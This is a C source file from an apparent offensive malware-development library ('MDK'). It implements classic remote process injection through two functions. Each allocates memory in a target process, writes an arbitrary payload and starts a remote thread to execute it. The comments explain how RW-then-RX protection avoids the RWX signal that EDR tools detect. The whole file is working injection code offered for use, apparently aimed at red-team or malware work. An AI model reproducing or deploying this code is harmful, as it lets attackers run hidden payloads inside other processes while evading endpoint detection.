// MDK
// docs    : https://sebafvs.com/mdk/classic
// author  : @sebafvs

#include <windows.h>
#include "mdk/execution.h"
#include "mdk/memory.h"
#include "mdk/thread.h"
#include "mdk/nt.h"

// Avoids PAGE_EXECUTE_READWRITE at rest: allocates RW, writes payload, flips to RX before executing.
MDK_RESULT mdk_classic(IN HANDLE process, IN const BYTE* payload, IN SIZE_T size) {
    PVOID  remote_address      = NULL;
    DWORD  previous_protection = 0;
    HANDLE thread             = NULL;

    MDK_CHECK(mdk_alloc(process, size, PAGE_READWRITE, &remote_address));

    MDK_RESULT result = mdk_write(process, remote_address, payload, size);
    if (MDK_FAIL(result)) {
        mdk_free(process, remote_address);
        return result;
    }

    result = mdk_protect(process, remote_address, size, PAGE_EXECUTE_READ, &previous_protection);
    if (MDK_FAIL(result)) {
        mdk_free(process, remote_address);
        return result;
    }

    result = mdk_create_remote_thread(process, remote_address, NULL, 0, &thread);
    if (MDK_FAIL(result)) {
        mdk_free(process, remote_address);
        return result;
    }

    mdk_close_thread(thread);
    return MDK_MAKE_OK();
}

// RWX region is a common EDR signal, use mdk_classic unless testing raw allocation behavior.
MDK_RESULT mdk_classic_rwx(IN HANDLE process, IN const BYTE* payload, IN SIZE_T size) {
    PVOID  remote_address = NULL;
    HANDLE thread        = NULL;

    MDK_CHECK(mdk_alloc(process, size, PAGE_EXECUTE_READWRITE, &remote_address));

    MDK_RESULT result = mdk_write(process, remote_address, payload, size);
    if (MDK_FAIL(result)) {
        mdk_free(process, remote_address);
        return result;
    }

    result = mdk_create_remote_thread(process, remote_address, NULL, 0, &thread);
    if (MDK_FAIL(result)) {
        mdk_free(process, remote_address);
        return result;
    }

    mdk_close_thread(thread);
    return MDK_MAKE_OK();
}
